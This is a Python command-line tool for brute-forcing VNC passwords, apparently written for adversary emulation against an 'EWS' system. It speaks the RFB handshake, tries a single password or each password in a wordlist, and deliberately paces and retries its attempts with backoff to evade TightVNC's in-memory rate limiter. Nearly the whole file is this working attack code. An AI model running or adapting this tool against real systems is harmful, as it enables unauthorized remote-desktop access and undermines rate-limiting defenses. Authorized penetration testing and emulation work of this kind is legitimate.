#!/usr/bin/env python3
"""RFB VncAuth probe and wordlist brute for SecretCon EWS validation."""
from __future__ import annotations

import argparse
import json
import socket
import struct
import sys
import time
from enum import Enum
from pathlib import Path


# Default pacing for wordlist sweeps. TightVNC arms an in-memory pace limiter
# (distinct from the registry BlacklistThreshold) after a wrong guess and stops
# offering VncAuth (type 2) on immediate back-to-back attempts. A small inter-
# attempt delay mirrors Metasploit's BRUTEFORCE_SPEED 0 and keeps the sweep
# reliable. See docs/runbooks/ews-vnc-adversary-emulation.md.
DEFAULT_WORDLIST_DELAY = 0.5
# Retries per candidate when the pace limiter trips (transient reject).
DEFAULT_TRANSIENT_RETRIES = 3


class AuthOutcome(str, Enum):
    OK = "ok"
    WRONG_PASSWORD = "wrong_password"
    NO_VNC_AUTH = "no_vnc_auth"
    BLACKLISTED = "blacklisted"
    CONNECTION_REFUSED = "connection_refused"
    PROTOCOL_ERROR = "protocol_error"


# Outcomes that mean the pace limiter tripped (server stopped offering VncAuth
# or briefly blacklisted us), not that the password was wrong. Retry the same
# candidate with backoff before moving on.
TRANSIENT_OUTCOMES = frozenset(
    {
        AuthOutcome.NO_VNC_AUTH,
        AuthOutcome.BLACKLISTED,
        AuthOutcome.CONNECTION_REFUSED,
    }
)


class VncAuthError(Exception):
    def __init__(self, outcome: AuthOutcome, detail: str) -> None:
        super().__init__(detail)
        self.outcome = outcome
        self.detail = detail


def _load_vnc_cred_tool(repo_tool: Path | None):
    if repo_tool and repo_tool.is_file():
        import importlib.util

        spec = importlib.util.spec_from_file_location("vnc_cred_tool", repo_tool)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        return mod
    raise FileNotFoundError(f"vnc-cred-tool not found: {repo_tool}")


def _recv(sock: socket.socket, n: int) -> bytes:
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise VncAuthError(
                AuthOutcome.PROTOCOL_ERROR,
                "connection closed during RFB handshake",
            )
        buf += chunk
    return buf


def try_vnc_auth(host: str, port: int, password: str, vnc_mod) -> int:
    """Return RFB SecurityResult code (0 = OK). Raises VncAuthError on setup failures."""
    try:
        sock = socket.create_connection((host, port), timeout=15)
    except (ConnectionRefusedError, TimeoutError, OSError) as exc:
        raise VncAuthError(
            AuthOutcome.CONNECTION_REFUSED,
            f"cannot connect to {host}:{port}: {exc}",
        ) from exc

    with sock:
        _recv(sock, 12)
        sock.sendall(b"RFB 003.008\n")
        ntypes = _recv(sock, 1)[0]
        types = _recv(sock, ntypes)
        if 2 not in types:
            raise VncAuthError(
                AuthOutcome.NO_VNC_AUTH,
                f"server did not offer VncAuth (types={list(types)}); "
                "likely blacklisted or rejecting connections",
            )
        sock.sendall(bytes([2]))
        challenge = _recv(sock, 16)
        sock.sendall(vnc_mod.compute_vnc_response(password, challenge))
        raw = _recv(sock, 4)
        return struct.unpack(">I", raw)[0]


def classify_result(code: int) -> AuthOutcome:
    if code == 0:
        return AuthOutcome.OK
    if code == 1:
        return AuthOutcome.WRONG_PASSWORD
    # TightVNC may return non-standard codes when rate-limited.
    if code in (0xFFFFFFE2, 0xFFFFFFE0):  # -30, -32 as unsigned
        return AuthOutcome.BLACKLISTED
    return AuthOutcome.WRONG_PASSWORD


def probe_password(
    host: str, port: int, password: str, vnc_mod
) -> tuple[AuthOutcome, int | None]:
    try:
        code = try_vnc_auth(host, port, password, vnc_mod)
    except VncAuthError as exc:
        return exc.outcome, None
    return classify_result(code), code


def load_wordlist(path: Path) -> list[str]:
    entries: list[str] = []
    for line in path.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        entries.append(line)
    return entries


def _probe_with_retries(
    host: str,
    port: int,
    password: str,
    vnc_mod,
    *,
    delay_seconds: float,
    max_retries: int,
) -> tuple[AuthOutcome, int | None, int, AuthOutcome | None]:
    """Probe one candidate, retrying on transient (pace-limiter) outcomes.

    Returns (outcome, code, retries_used, transient_seen). transient_seen is
    the pace-limiter outcome that prompted a retry (None if no retry ran).
    Retries use exponential backoff seeded on delay_seconds so the in-memory
    limiter has time to drain.
    """
    retries = 0
    transient_seen: AuthOutcome | None = None
    while True:
        outcome, code = probe_password(host, port, password, vnc_mod)
        if outcome not in TRANSIENT_OUTCOMES or retries >= max_retries:
            return outcome, code, retries, transient_seen
        transient_seen = outcome
        retries += 1
        backoff = max(delay_seconds, 0.1) * (retries + 1)
        time.sleep(backoff)


def brute_wordlist(
    host: str,
    port: int,
    wordlist: Path,
    vnc_mod,
    *,
    stop_on_first: bool = True,
    delay_seconds: float = DEFAULT_WORDLIST_DELAY,
    max_retries: int = DEFAULT_TRANSIENT_RETRIES,
) -> dict:
    passwords = load_wordlist(wordlist)
    attempts = 0
    total_retries = 0
    found: str | None = None
    last_outcome = AuthOutcome.WRONG_PASSWORD
    last_retry_outcome: AuthOutcome | None = None

    for index, password in enumerate(passwords):
        # Pace every attempt after the first to avoid arming the in-memory
        # rate limiter (mirrors Metasploit BRUTEFORCE_SPEED 0).
        if index > 0 and delay_seconds > 0:
            time.sleep(delay_seconds)

        attempts += 1
        outcome, _code, retries, transient_seen = _probe_with_retries(
            host,
            port,
            password,
            vnc_mod,
            delay_seconds=delay_seconds,
            max_retries=max_retries,
        )
        total_retries += retries
        last_outcome = outcome
        if transient_seen is not None:
            last_retry_outcome = transient_seen

        if outcome == AuthOutcome.OK:
            found = password
            if stop_on_first:
                break
            continue
        if outcome == AuthOutcome.WRONG_PASSWORD:
            continue
        # Still transient after exhausting retries: the pace limiter (or a
        # hard connection failure) won't clear within this sweep. Stop and
        # surface the outcome so the caller can pace harder / re-converge.
        if outcome in TRANSIENT_OUTCOMES:
            break
        if outcome == AuthOutcome.PROTOCOL_ERROR:
            break

    return {
        "host": host,
        "port": port,
        "wordlist": str(wordlist),
        "attempts": attempts,
        "password_count": len(passwords),
        "retries": total_retries,
        "last_retry_outcome": last_retry_outcome.value if last_retry_outcome else None,
        "found": found,
        "success": found is not None,
        "last_outcome": last_outcome.value,
        "delay_seconds": delay_seconds,
    }


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, default=5900)
    parser.add_argument("--password", help="Single password probe")
    parser.add_argument("--wordlist", type=Path, help="Wordlist brute (RFB, Hydra replacement)")
    parser.add_argument(
        "--cred-tool",
        type=Path,
        required=True,
        help="Path to scripts/observability/vnc-cred-tool.py on controller",
    )
    parser.add_argument(
        "--delay-seconds",
        type=float,
        default=DEFAULT_WORDLIST_DELAY,
        help=(
            "Inter-attempt delay for wordlist sweeps (default "
            f"{DEFAULT_WORDLIST_DELAY}s). Paces the brute to avoid TightVNC's "
            "in-memory rate limiter; mirrors Metasploit BRUTEFORCE_SPEED 0."
        ),
    )
    parser.add_argument(
        "--max-retries",
        type=int,
        default=DEFAULT_TRANSIENT_RETRIES,
        help=(
            "Retries per candidate on transient (pace-limiter) rejects "
            f"before giving up (default {DEFAULT_TRANSIENT_RETRIES})."
        ),
    )
    parser.add_argument("--json", action="store_true", help="Emit machine-readable JSON")
    args = parser.parse_args()

    if not args.password and not args.wordlist:
        parser.error("provide --password and/or --wordlist")
    if args.password and args.wordlist:
        parser.error("use --password or --wordlist, not both")

    vnc_mod = _load_vnc_cred_tool(args.cred_tool)

    if args.wordlist:
        if not args.wordlist.is_file():
            print(f"wordlist not found: {args.wordlist}", file=sys.stderr)
            return 2
        result = brute_wordlist(
            args.host,
            args.port,
            args.wordlist,
            vnc_mod,
            delay_seconds=args.delay_seconds,
            max_retries=args.max_retries,
        )
        if args.json:
            print(json.dumps(result))
        elif result["success"]:
            print(f"VncAuth OK password={result['found']} attempts={result['attempts']}")
        elif result["last_outcome"] in {o.value for o in TRANSIENT_OUTCOMES}:
            print(
                f"VncAuth brute aborted after {result['attempts']} attempts "
                f"(last_outcome={result['last_outcome']}, retries={result['retries']}). "
                "This is TightVNC's in-memory pace limiter, not the registry "
                "blacklist. Increase --delay-seconds or use Metasploit "
                "vnc_login with BRUTEFORCE_SPEED 0.",
                file=sys.stderr,
            )
        else:
            print(
                f"VncAuth brute failed after {result['attempts']} attempts "
                f"(last_outcome={result['last_outcome']})",
                file=sys.stderr,
            )
        return 0 if result["success"] else 1

    outcome, code = probe_password(args.host, args.port, args.password, vnc_mod)
    payload = {
        "host": args.host,
        "port": args.port,
        "password": args.password,
        "outcome": outcome.value,
        "security_result": code,
        "success": outcome == AuthOutcome.OK,
    }
    if args.json:
        print(json.dumps(payload))
    elif outcome == AuthOutcome.OK:
        print(f"VncAuth OK for {args.host}:{args.port}")
    else:
        print(
            f"VncAuth failed for {args.host}:{args.port} "
            f"(outcome={outcome.value}, SecurityResult={code})",
            file=sys.stderr,
        )
    return 0 if outcome == AuthOutcome.OK else 1


if __name__ == "__main__":
    sys.exit(main())
